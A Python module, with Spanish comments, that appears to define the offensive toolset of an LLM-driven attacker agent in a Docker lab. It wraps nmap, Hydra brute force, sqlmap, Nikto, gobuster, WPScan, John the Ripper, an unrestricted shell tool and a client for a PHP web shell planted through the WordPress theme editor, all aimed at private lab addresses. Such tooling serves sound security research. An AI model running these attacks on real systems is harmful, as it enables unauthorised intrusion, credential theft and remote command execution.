"""
Herramientas de pentesting disponibles para el agente atacante.

Cada herramienta es un wrapper que ejecuta un comando en el container atacante
via Docker SDK. El LLM decide que herramienta usar y con que parametros;
este modulo se encarga de la ejecucion real.

Las herramientas se registran como LangChain Tools para que LangGraph las pueda
invocar automaticamente cuando el LLM las solicita (patron ReAct: el LLM emite
un tool_call, LangGraph ejecuta la tool, y el resultado vuelve al LLM).
"""

import logging

from langchain_core.tools import tool

from src.infrastructure.docker_client import DockerClient

logger = logging.getLogger(__name__)

_docker = DockerClient()


@tool
def run_nmap(target: str, flags: str = "-sV -sC") -> str:
    """Ejecuta un escaneo nmap contra el objetivo.

    Args:
        target: IP o rango a escanear (ej: "10.10.0.10")
        flags: Flags de nmap (ej: "-sV -sC", "-p-", "-sU --top-ports 100")

    Returns:
        Output del escaneo nmap
    """
    command = f"nmap {flags} {target}"
    result = _docker.exec_in_attacker(command, timeout=180)
    if result.exit_code != 0 and result.stderr:
        return f"Error: {result.stderr}"
    return result.stdout


@tool
def run_hydra(target: str, service: str, username: str = "admin", password_list: str = "/usr/share/wordlists/rockyou.txt") -> str:
    """Ejecuta un ataque de fuerza bruta con Hydra contra un servicio.

    Args:
        target: IP del objetivo
        service: Servicio a atacar (ej: "ssh", "ftp", "http-post-form")
        username: Usuario a probar
        password_list: Ruta al archivo de passwords en el container atacante

    Returns:
        Output de Hydra mostrando si encontro credenciales validas
    """
    command = f"hydra -l {username} -P {password_list} {target} {service} -t 4 -f -V 2>&1 | tail -30"
    result = _docker.exec_in_attacker(command, timeout=120)
    return result.stdout or result.stderr


@tool
def run_sqlmap(url: str, extra_flags: str = "--batch --level=2") -> str:
    """Ejecuta sqlmap para detectar y explotar inyecciones SQL.

    Args:
        url: URL vulnerable con parametro inyectable (ej: "http://10.10.0.10/vulnerabilities/sqli/?id=1&Submit=Submit")
        extra_flags: Flags adicionales para sqlmap

    Returns:
        Output de sqlmap con resultados de inyeccion
    """
    command = f"sqlmap -u '{url}' {extra_flags} 2>&1 | tail -60"
    result = _docker.exec_in_attacker(command, timeout=180)
    return result.stdout or result.stderr


@tool
def run_command(command: str) -> str:
    """Ejecuta un comando shell arbitrario en el container atacante o via SSH en el target.

    Esta herramienta es la mas flexible. Se usa para:
    - Ejecucion de comandos tras obtener acceso (Execution, Discovery)
    - Enumeracion del sistema (uname, cat /etc/passwd, etc.)
    - Cualquier comando que no tiene wrapper dedicado

    Args:
        command: Comando bash a ejecutar

    Returns:
        Output del comando (stdout + stderr)
    """
    result = _docker.exec_in_attacker(command, timeout=60)
    output = result.stdout
    if result.stderr:
        output += f"\nSTDERR: {result.stderr}"
    return output


@tool
def run_curl(url: str, method: str = "GET", data: str = "", headers: str = "") -> str:
    """Realiza una peticion HTTP con curl.

    Util para interactuar con aplicaciones web, enviar payloads,
    y verificar endpoints durante Initial Access y Execution.

    Args:
        url: URL completa a consultar
        method: Metodo HTTP (GET, POST, PUT)
        data: Datos para POST/PUT
        headers: Headers adicionales (ej: "Cookie: PHPSESSID=abc123")

    Returns:
        Respuesta HTTP (headers + body)
    """
    cmd_parts = [f"curl -s -i -X {method}"]
    if headers:
        for h in headers.split(";"):
            cmd_parts.append(f"-H '{h.strip()}'")
    if data:
        cmd_parts.append(f"-d '{data}'")
    cmd_parts.append(f"'{url}'")

    command = " ".join(cmd_parts)
    result = _docker.exec_in_attacker(command, timeout=30)
    return result.stdout or result.stderr


@tool
def run_nikto(target: str, flags: str = "") -> str:
    """Escanea vulnerabilidades web con Nikto.

    Args:
        target: IP o URL del objetivo (ej: "10.10.0.20")
        flags: Flags adicionales para nikto

    Returns:
        Output de nikto con vulnerabilidades y tecnologias encontradas
    """
    command = f"/usr/local/bin/nikto -h {target} {flags} 2>&1 | tail -60"
    result = _docker.exec_in_attacker(command, timeout=180)
    return result.stdout or result.stderr


@tool
def run_gobuster(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", flags: str = "") -> str:
    """Enumera directorios y archivos en un servidor web con gobuster.

    Si el wordlist especificado no existe, usa uno minimo de rutas WordPress integrado.

    Args:
        url: URL base del objetivo (ej: "http://10.10.0.20")
        wordlist: Ruta al wordlist en el container atacante
        flags: Flags adicionales para gobuster

    Returns:
        Directorios y archivos encontrados
    """
    builtin = (
        "wp-admin\\nwp-login.php\\nwp-content\\nwp-includes\\nxmlrpc.php\\n"
        "wp-json\\nwp-cron.php\\nwp-signup.php\\nrobots.txt\\nlicense.txt\\n"
        "readme.html\\nadmin\\nlogin\\nwp-config.php.bak\\nbackup\\nuploads\\n"
    )
    command = (
        f"if [ -f {wordlist} ]; then wl={wordlist}; "
        f"else printf '{builtin}' > /tmp/gobuster_wl.txt && wl=/tmp/gobuster_wl.txt; fi; "
        f"gobuster dir -u {url} -w $wl -q {flags} 2>&1 | head -60"
    )
    result = _docker.exec_in_attacker(command, timeout=120)
    return result.stdout or result.stderr


@tool
def run_wpscan(url: str, flags: str = "--enumerate u --disable-tls-checks") -> str:
    """Escanea un sitio WordPress con WPScan para enumerar usuarios y vulnerabilidades.

    Args:
        url: URL del sitio WordPress (ej: "http://10.10.0.20")
        flags: Flags adicionales de wpscan

    Returns:
        Output de wpscan con usuarios, plugins y vulnerabilidades
    """
    command = f"wpscan --url {url} {flags} 2>&1 | tail -80"
    result = _docker.exec_in_attacker(command, timeout=180)
    return result.stdout or result.stderr


@tool
def run_web_shell(cmd: str, url: str = "http://10.10.0.20/shell.php") -> str:
    """Ejecuta un comando en el target via webshell PHP desplegada durante Execution.

    Requiere que la webshell haya sido creada previamente via el theme editor
    de WordPress (/wp-admin/theme-editor.php).

    Args:
        cmd: Comando shell a ejecutar en el servidor target
        url: URL de la webshell (default: http://10.10.0.20/shell.php)

    Returns:
        Output del comando ejecutado en el target
    """
    import urllib.parse
    encoded = urllib.parse.quote(cmd)
    request_cmd = f"curl -s '{url}?cmd={encoded}'"
    result = _docker.exec_in_attacker(request_cmd, timeout=30)
    return result.stdout or result.stderr


@tool
def run_john(hash_content: str, wordlist: str = "/opt/wordlists/mrrobot.txt") -> str:
    """Crack hashes de contrasena con John the Ripper.

    Args:
        hash_content: Hash en formato john (ej: "robot:c3fcd3d76192e4007dfb496cca67e13b")
        wordlist: Ruta al wordlist en el container atacante

    Returns:
        Contrasena crackeada o output de john
    """
    commands = [
        f"echo '{hash_content}' > /tmp/hash_crack.txt",
        f"john --format=raw-md5 --wordlist={wordlist} /tmp/hash_crack.txt 2>&1",
        "john --show --format=raw-md5 /tmp/hash_crack.txt 2>&1",
    ]
    command = " && ".join(commands)
    result = _docker.exec_in_attacker(command, timeout=60)
    return result.stdout or result.stderr


# Lista de todas las herramientas disponibles para el agente atacante.
# Se pasa al LLM via bind_tools() para que sepa que puede invocar.
ATTACKER_TOOLS = [
    run_nmap,
    run_hydra,
    run_sqlmap,
    run_command,
    run_curl,
    run_nikto,
    run_gobuster,
    run_wpscan,
    run_web_shell,
    run_john,
]
